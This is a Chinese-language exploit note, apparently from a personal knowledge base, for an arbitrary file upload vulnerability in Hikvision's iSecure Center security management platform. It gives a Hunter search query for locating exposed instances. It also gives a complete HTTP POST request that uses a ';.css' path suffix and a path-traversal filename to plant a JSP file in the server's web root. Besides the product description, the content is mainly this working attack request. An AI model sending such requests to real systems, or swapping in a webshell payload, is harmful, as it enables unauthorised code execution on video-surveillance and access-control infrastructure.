# 海康威视iSecure Center综合安防管理平台lm任意文件上传漏洞

# <font style="color:rgb(0, 0, 0);">1、漏洞描述</font>
<font style="color:rgb(0, 0, 0);">HIKVISION iSecure Center综合安防管理平台是一套“集成化”、“智能化”的平台，通过接入视频监控、一卡通、停车场、报警检测等系统的设备，获取边缘节点数据，实现安防信息化集成与联动，以电子地图为载体，融合各系统能力实现丰富的智能应用。HIKVISION iSecure Center平台基于“统一软件技术架构”先进理念设计，采用业务组件化技术，满足平台在业务上的弹性扩展。该平台适用于全行业通用综合安防业务，对各系统资源进行了整合和集中管理，实现统一部署、统一配置、统一管理和统一调度。海康威视isecure center 综合安防管理平台存在任意文件上传漏洞</font>

# <font style="color:rgb(0, 0, 0);">2、影响版本</font>
<font style="color:rgb(0, 0, 0);">HIKVISION iSecure Center综合安防管理平台 </font>

![1691858081036-d871cda5-31d1-4693-a77d-41c0bb876b49.png](./img/5ZrA5yjv_Euokk9i/1691858081036-d871cda5-31d1-4693-a77d-41c0bb876b49-238063.png)

# <font style="color:rgb(0, 0, 0);">3、资产测绘</font>
**hunter查询语法：**

`app.name=="Hikvision 海康威视 iSecure Center"`

# 4、漏洞复现
```plain
POST /lm/api/files;.css HTTP/1.1
Host: 192.168.110.74
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVBf7Cs8QWsfwC82M
Content-Length: 342
SL-CE-SUID: 39

------WebKitFormBoundaryVBf7Cs8QWsfwC82M
Content-Disposition: form-data; name="file"; filename="../../../../../tomcat85linux64.1/webapps/els/static/axaaxs.jsp"
Content-Type: application/zip

<% out.println("testaxssax");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryVBf7Cs8QWsfwC82M--
```

![1705912656579-0b74f2f8-cbab-4b04-a900-bb1f98c17b36.png](./img/5ZrA5yjv_Euokk9i/1705912656579-0b74f2f8-cbab-4b04-a900-bb1f98c17b36-353064.png)

上传文件位置

```plain
/els/static/axaaxs.jsp
```

![1705912686065-2a7d66ab-a16e-4db2-bfbe-e0625f20dd76.png](./img/5ZrA5yjv_Euokk9i/1705912686065-2a7d66ab-a16e-4db2-bfbe-e0625f20dd76-489678.png)



> 更新: 2024-02-29 23:57:17  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hezxivrgwt7xmo53>